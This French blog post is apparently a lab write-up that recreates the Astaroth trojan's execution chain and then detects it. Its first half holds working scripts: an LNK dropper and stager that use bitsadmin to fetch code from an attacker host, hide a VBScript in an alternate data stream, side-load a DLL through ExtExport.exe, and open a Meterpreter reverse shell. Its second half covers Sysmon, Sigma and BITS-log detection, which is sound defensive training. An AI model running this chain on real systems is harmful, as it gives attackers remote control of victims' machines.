---
layout: post
title: Attack Detection Fundamentals - Code Execution 
subtitle: DLL Side-Loading et LOLBins
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
tags: [Astaroth, LOLBin, ADS, ExtEport, Meterpreter, Windows, Blue Team, Red Team, msfvenom, dropper, stager, BITSAdmin, Fileless attack, Streams, Sigma, Sysmon, MITRE ATT&CK, DLL Side-Loading, Defense Evasion, Sysinternals]
---

![ec1d8681b927b62a4ea1244ee674254b.png](/img/6e0c09ebc65948beb0f862c74d942092.png){: .center-block :}

Dans les 3 labs précédents nous avons vu comment obtenir un accès initial dans une machine Windows en utilisant des maldocs. Nous avons utilisé plusieurs C2 frameworks (Covenant, Koadic et Cobalt Strike), et étudié quelques méthodes d'évasion utilisant des LOLBin.

- [Attack Detection Fundamentals: Initial Access - Lab #1](https://0xss0rz.github.io/2021-01-04-Attack-Detection-Initial-Access-1/){:target="_blank"}
- [Attack Detection Fundamentals: Initial Access - Lab #2](https://0xss0rz.github.io/2021-01-04-Attack-Detection-Initial-Access-2/){:target="_blank"}
- [Attack Detection Fundamentals: Initial Access - Lab #3](https://0xss0rz.github.io/2021-01-06-Attack-Detection-Initial-Access-3/){:target="_blank"}

Dans ce premier lab de la série *Code Execution and Persistence* du workshop de F-Secure, nous nous intéresserons au malware Astaroth et reproduirons les grandes étapes qui lui permette d'exécuter du code. [1] Nous en sommes désormais à la deuxième étape du framework MITRE ATT&CK [2]

![ab1600a29e071871b37320cc3ea80911.png](/img/2a90acf52b714b44b7be70e0b1a8ac20.png)

{: .box-note}
***Code Execution** consists of techniques that result in adversary-controlled code running on a local or remote system.*
***Astaroth** is a trojan and information stealer (...). It is used in a fileless malware campaign in the memory of infected computers. Astaroth also abuses living-off-the-land binaries (LOLbins).[3]*
***LOLBins** are binaries that can be used by an attacker to perform actions beyond their original purpose [4]*

**Attack chain:**

![1979b3298c4719bdd5fcdffc3c8d477c.png](/img/afb0c1f300f94ef5a7dfd59e1ed7b2b1.png)
Source: [5]

Initialement les attaquants abusaient Windows Management Instrumentation Command-line (WMIC) pour éviter la détection. Désormais ils utilisent les méthodes suivantes [5]:

1. Abus de Alternate Data Stream (ADS) pour cacher les payloads
2. Abus de ExtExport.exe pour charger le payload
3. Abus de BITSAdmin

BITSAdmin et ExtExport sont deux LOLBins. [6,7]

{: .box-note}
***Backround Intelligent Transfer Service Admin (BITSAdmin)**  is a command-line tool used to create, download or upload jobs, and to monitor their progress.* [8]

BITSAdmin est préinstallé sur les OS Windows et peut être utilisé pour télécharger des fichiers malicieux. [9]

{: .box-note}
***Alternate Data Streams (ADS)** are a file attribute only found on the NTFS file system.[10]*

![9626ae804427f1d663ab7719bd7e7b9e.png](/img/c7207f74b332490eb0071507c0f4e6a9.png)
Source: [11]

ADS peut être utilisé par les attaquants pour cacher des payloads, etc. [12]

**DLL Side-Loading:**

![9341e8b57fee42bfe5b2d6c407e83a28.png](/img/a3cf71de93fd45f680e0adbc1559d410.png)
Source: [13]

**Config du lab:** Afin de simuler cette attaque nous utiliserons une VM Kali et une VM Windows 7

**Étapes du lab:**
1. Création d'un dropper
2. Création d'un stager
3. Création du payload
4. Création d'un listener
5. Création du serveur
6. Exécution de l'attaque

Le schéma suivant résume les étapes de l'attaque que nous allons créer:

![9492ab5ac512186261b70f0b88ed1801.png](/img/37e8e34768674f94a41fe27c94dea8c6.png)

**1. Création du dropper**

Nous allons créer un dropper qui imite celui délivré par phising lors de la campagne Astaroth.

Pour cela, nous créons un batch qui utilise un script temporaire VBScript pour créer le dropper LNK.

Enregistrer le code suivant en .bat sur la VM Windows 7:

```
@echo off

setlocal enabledelayedexpansion

rem Create a dropper in LNK (shortcut) format that will download and execute the CMD stager.

set SERVER=http://<attacking_ip>/

set PATH_PUBLIC_DIR=C:\Users\Public\Libraries\raw\
rem Create the target directoty if it does not exist.
if not exist "%PATH_PUBLIC_DIR%" mkdir %PATH_PUBLIC_DIR%

set DROPPER_LNK=clickme.lnk
set STAGER_CMD=stager.cmd
set DROPPER_LNK_CREATE=dropper_lnk_create.vbs

set URL_STAGER_CMD=%SERVER%%STAGER_CMD%

set PATH_DROPPER_LNK_CREATE=%PATH_PUBLIC_DIR%%DROPPER_LNK_CREATE%
set PATH_DROPPER_LNK=%PATH_PUBLIC_DIR%%DROPPER_LNK%
set PATH_STAGER_CMD=%PATH_PUBLIC_DIR%%STAGER_CMD%

rem Use a temporary VBScript to create the LNK dropper.
rem The LNK dropper will contain code to download, execute and delete the CMD stager.
echo Set oWS = WScript.CreateObject("WScript.Shell") > %PATH_DROPPER_LNK_CREATE%
echo sLinkFile = "%PATH_DROPPER_LNK%" >> %PATH_DROPPER_LNK_CREATE%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %PATH_DROPPER_LNK_CREATE%
echo oLink.TargetPath = "C:\Windows\System32\cmd.exe" >> %PATH_DROPPER_LNK_CREATE%
echo oLink.Arguments = "/c bitsadmin /transfer 1 /priority FOREGROUND %URL_STAGER_CMD% %PATH_STAGER_CMD% & call %PATH_STAGER_CMD% & del %PATH_STAGER_CMD%" >> %PATH_DROPPER_LNK_CREATE%
echo oLink.Save >> %PATH_DROPPER_LNK_CREATE%
cscript %PATH_DROPPER_LNK_CREATE%
del %PATH_DROPPER_LNK_CREATE%
```

![4e17aa697e180fd82a335de882ea2a79.png](/img/9b1f0c3af7c343a6b3ca5df5e1c4a2e5.png)

Lorsque exécuté, crée `clickme.lnk`

![ea56623d6963f24f2d15aea65a10ef6f.png](/img/5008cfd7fb9648e386da929f407b3d59.png)

**2. Création du stager**

Path de ExtExport: `C:\Program Files\Internet Explorer\Extexport.exe` pour Win 7, sinon: `C:\Program Files\Internet Explorer (x86)\Extexport.exe`

La victime étant sous Win 7, enregistrer le code suivant sous `stager.cmd` sur la VM Kali:

```
@echo off

setlocal enabledelayedexpansion

set SERVER=http://<attacking_ip>/

set PATH_PUBLIC_DIR=C:\Users\Public\Libraries\raw\
rem Create the target directoty if it does not exist.
if not exist "%PATH_PUBLIC_DIR%" mkdir %PATH_PUBLIC_DIR%

set PAYLOAD_DLL=payload.dll
set TARGET_ADS=desktop.ini
set LAUNCHER_LNK=launcher.lnk
set LAUNCHER_CREATE_VBS=launcher_create.vbs

set URL_PAYLOAD_DLL=%SERVER%%PAYLOAD_DLL%

rem ExtExport.exe looks for any DLL with the following names.
set EXTEXPORT_DLLS[1]=mozcrt19.dll
set EXTEXPORT_DLLS[2]=mozsqlite3.dll
set EXTEXPORT_DLLS[3]=sqlite3.dll

rem Select one DLL filename at random.
set /a _rand=%RANDOM% %% 3 + 1
set EXTEXPORT_DLL=!EXTEXPORT_DLLS[%_rand%]!

set PATH_EXTEXPORT_DLL=%PATH_PUBLIC_DIR%%EXTEXPORT_DLL%
set PATH_LAUNCHER_LNK=%PATH_PUBLIC_DIR%%LAUNCHER_LNK%
set PATH_LAUNCHER_CREATE_VBS=%PATH_PUBLIC_DIR%%LAUNCHER_CREATE_VBS%

set PATH_LAUNCHER_CREATE_ADS=%PATH_PUBLIC_DIR%%TARGET_ADS%:%LAUNCHER_CREATE_VBS%

set PATH_EXTEXPORT_EXE=C:\Program Files\Internet Explorer\Extexport.exe
set EXTEXPORT_ARGS=C:\Users\Public\Libraries\raw foo bar

rem Download the renamed DLL payload from the server.
bitsadmin /transfer 2 /priority FOREGROUND %URL_PAYLOAD_DLL% %PATH_EXTEXPORT_DLL%

rem Use a temporary VBScript to create the LNK launcher.
rem The launcher will take the renamed DLL payload and load it using ExtExport.
echo Set oWS = WScript.CreateObject("WScript.Shell") > %PATH_LAUNCHER_CREATE_VBS%
echo sLinkFile = "%PATH_LAUNCHER_LNK%" >> %PATH_LAUNCHER_CREATE_VBS%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %PATH_LAUNCHER_CREATE_VBS%
echo oLink.TargetPath = "%PATH_EXTEXPORT_EXE%" >> %PATH_LAUNCHER_CREATE_VBS%
echo oLink.Arguments = "%EXTEXPORT_ARGS%" >> %PATH_LAUNCHER_CREATE_VBS%
echo oLink.Save >> %PATH_LAUNCHER_CREATE_VBS%

rem Copy the launcher creation VBScript to the Alternate Data Stream (ADS) of desktop.ini and erase it.
type %PATH_LAUNCHER_CREATE_VBS% > %PATH_LAUNCHER_CREATE_ADS% && erase %PATH_LAUNCHER_CREATE_VBS%

rem Execute the launcher creation VBScript from the Alternate Data Stream (ADS).
cscript %PATH_LAUNCHER_CREATE_ADS%

rem Execute the LNK launcher. This will use ExtExport.exe to side load and execute the DLL payload.
start /b %PATH_LAUNCHER_LNK%
```
**Explication:**

Télécharge le payload Meterpreter 

`bitsadmin /transfer <job_name> /priority FOREGROUND <remote_filename> <local_filename>`

Le payload est renommé dans l'un des 3 noms que Extexport recherche (mozcrt19.dll, mozsqlite3.dll or sqlite3.dll) et l'enregistre dans `C:\Users\Public\Libraries\raw` où Extexport le trouvera.

Pour que ça se produise nous avons besoin d'un launcher. Ce launcher est généré par un code VBScript qui se copiera dans l'ADS de desktop.ini et s'auto supprimera pour cacher les traces.

`type <evil_file> <target_file:evil_file> && erase <evil_file>`

Éxecuter le générateur pour obtenir le launcher

`cscript <target_file:evil_file>`

Le launcher utilise ExtExport. Executer le launcher

`start /b <file>`

**3. Création du payload**

Générer un payload Meterpreter au format dll

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacking_ip> LPORT=4444 -f dll -o payload.dll`

![0abeda6d174b5e66d27c678965e8861e.png](/img/cc313ea70e0049f7bf537f46b813a6ab.png)

**4. Création du listener**

Lancer metasploit et configurer le listener, payload `windows/meterpreter/reverse_tcp`

![585865f4f0c794b5ecc2bce687cd9f82.png](/img/ff16612ffce34420badb8804dfacbc0b.png)

**5. Lancer le serveur http**

Regrouper `stager.cmd` et `payload.dll` au même emplacement et lancer un serveur http: `python3 -m http.server 80`

**6. Exécution de l'attaque**

Lancer le dropper (double clic) ce qui crée `clickme.lnk` dans `C:\Users\Public\Libraries\raw`

Lancer `clickme.lnk` ce qui crée mozsqlite3.dll, desktop.ini, et le launcher

![f0e60fcbe1db60ccf46a6f47522f606c.png](/img/7ba4097c612e4a4ead0ac045844bffaf.png)

Coté Kali:

![c27068fe3c3af568d468122ef3f6acbc.png](/img/f982cabcc1d44bee92d670b4d7e3c233.png)

Et on obtient une session Meterpreter

![4b2918f92a190e1826ef66b927acf882.png](/img/953dd70a8ed54846bde4663b945bf5f1.png)

# Analyse

Recherche d'indicateurs de compromission:

**BITS**

- `sc query bits` [9]

![631e4b947668057f833ff8943aa23e38.png](/img/76d418bcdda5439bb5547828b289f1b1.png)

- Règle sigma

Génération de la règle en powershell

![fd8f6b3d6955bb431db0fefbe6851bcb.png](/img/566651842a0b417f938f16d8cd490d79.png)

Exécution:

![5bd8034bee3edcccc86164484e7a9d3d.png](/img/14af00447e084c1985b33f9c91465a79.png)

![889960036217a5d30bf2b5d4a6899216.png](/img/9e9e4ebbf75d48b29accfd24aab0b5d5.png)

Autre règle intéressante dans le cas ou des bits job sont lancés via powershell: `rules/windows/process_creation/win_powershell_bitsjob.yml`

- Evt id 59

Autre emplacement intéressant (logs) à consulter: `Microsoft-Windows-BITS-Client/Operational log.evtx`

![495b44b7b402b2e2af2dcfcc4f8d07e2.png](/img/c08ee182771b48b283362b9282c52431.png)

**ADS**

- `dir /R C:\Users\Public\Libraries\Raw` [12]

Voir screenshot de la session Meterpreter

- streams de sysinternals [10] et [14] 

`Stream -s <directory_name>`

![2a312ad9c3beeca3fa8a19b483e0252e.png](/img/0a279e02d7cd4ccea8894404601364e5.png)

**Sysmon:**
*(voir lab 1 initial access pour l'install)*

- Connections réseau

Plusieurs connection http avec kali dont une initiée par rundll32

![d06e74c1e9170eacf092c58362998218.png](/img/76518549eaac4b279cc765f629367b8a.png)

- Creation du processus `rundll32` par `ExtExport`

![c511b0e01123f1b2867835d45f604fd5.png](/img/de77b5cfd4d14944b425fde10100e730.png)
![28ff30f51a078e73e03e5878b273e35e.png](/img/6f2d972f01a6402c8d2cb6f8c3c87b56.png)

On retrouve le path `C:\Users\Public\Libraries\raw\`

- Création du processus `ExtExport` par `cmd`

![f45cb2ccc729299658f4af1350cb1495.png](/img/3d80238612364a939709919f7dda2c7a.png)

On voit `bitsadmin` apparaître ainsi que l'URL

- Création de `cscript` par `cmd` (même commande que pour ExtExport)

![ade077400a7b08a8db96a63e5d9b644f.png](/img/8491a7fde2d544eb81e105266d5ab513.png)

On voit `launcher_create.vbs`

- File Creation Time Changed ?

![1254ecdc36d07940326222c5a28e1581.png](/img/ea38dda738834e7ea420c3420d9bf0ed.png)

`BIT1C86.tmp`

Plusieurs évenements similaires

- Création de `bitsadmin` par `cmd` (même commande que pour ExtExport)

![bd19d42733f78c8d670ecda336cfe3e9.png](/img/da99c42d3a814f3c9b87892402163a18.png)

`payload.dll`

# Conclusion

Dans ce lab nous avons vu comment un malware pouvait exécuter du code en abusant ADS et les BITS jobs, comme le fait par example le trojan Astaroth.

Dans le prochain lab, nous verrons la troisième étape du framework MITRE ATT&CK, l'étape de persistance dans le système.

# Références

[1] F-Secure, [https://labs.f-secure.com/blog/attack-detection-fundamentals-code-execution-and-persistence-lab-1](https://labs.f-secure.com/blog/attack-detection-fundamentals-code-execution-and-persistence-lab-1){:target="_blank"}

[2] Rapid7, *What is the MITRE ATT&CK Framework?*, [https://www.rapid7.com/fundamentals/mitre-attack/](https://www.rapid7.com/fundamentals/mitre-attack/){:target="_blank"}

[3] NJCCIC, *Astaroth
NJCCIC Threat Profile*, [https://www.cyber.nj.gov/threat-center/threat-profiles/trojan-variants/astaroth/](https://www.cyber.nj.gov/threat-center/threat-profiles/trojan-variants/astaroth/){:target="_blank"}

[4] Oddvar Moe, *#Lolbins - Nothing to LOL about!*, [https://www.slideshare.net/OddvarHlandMoe/lolbins-nothing-to-lol-about](https://www.slideshare.net/OddvarHlandMoe/lolbins-nothing-to-lol-about){:target="_blank"}

[5] Microsoft, *Latest Astaroth living-off-the-land attacks are even more invisible but not less observable*, [https://www.microsoft.com/security/blog/2020/03/23/latest-astaroth-living-off-the-land-attacks-are-even-more-invisible-but-not-less-observable/](https://www.microsoft.com/security/blog/2020/03/23/latest-astaroth-living-off-the-land-attacks-are-even-more-invisible-but-not-less-observable/){:target="_blank"}

[6] LOLBAS Project, *Bitsadmin.exe*, [https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/){:target="_blank"}

[7] LOLBAS Project, *Extexport.exe*, [https://lolbas-project.github.io/lolbas/Binaries/Extexport/](https://lolbas-project.github.io/lolbas/Binaries/Extexport/){:target="_blank"}

[8] Microsoft, *bitsadmin*, [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin){:target="_blank"}

[9] Hacking Articles, *Windows for Pentester: BITSAdmin*, [https://www.hackingarticles.in/windows-for-pentester-bitsadmin/](https://www.hackingarticles.in/windows-for-pentester-bitsadmin/){:target="_blank"}

[10] Malwarebytes Labs, *Introduction to Alternate Data Streams*, [https://staging-blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/](https://staging-blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/){:target="_blank"}

[11] MITRE ATT&CK, *Hide Artifacts: NTFS File Attributes*, [https://attack.mitre.org/techniques/T1564/004/](https://attack.mitre.org/techniques/T1564/004/){:target="_blank"}

[12] Hacking Articles, *Defense Evasion: Alternate Data Streams*,[https://www.hackingarticles.in/defense-evasion-alternate-data-streams/](https://www.hackingarticles.in/defense-evasion-alternate-data-streams/){:target="_blank"}

[13] MITRE ATT&CK, *Hijack Execution Flow: DLL Side-Loading*, [https://attack.mitre.org/techniques/T1574/002/](https://attack.mitre.org/techniques/T1574/002/){:target="_blank"}

[14] Microsoft, *Streams*, [https://docs.microsoft.com/en-us/sysinternals/downloads/streams](https://docs.microsoft.com/en-us/sysinternals/downloads/streams){:target="_blank"}

**Poursuivez avec :** 

- [SSH Port Forwarding - Cheat Sheet](https://0xss0rz.github.io/2020-11-21-SSH-Tunneling/)

- [Hack The Box - Cache](https://0xss0rz.github.io/2020-11-18-HTB-Cache/)

- [Hack The Box - Remote](https://0xss0rz.github.io/2020-08-23-HTB-Remote/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
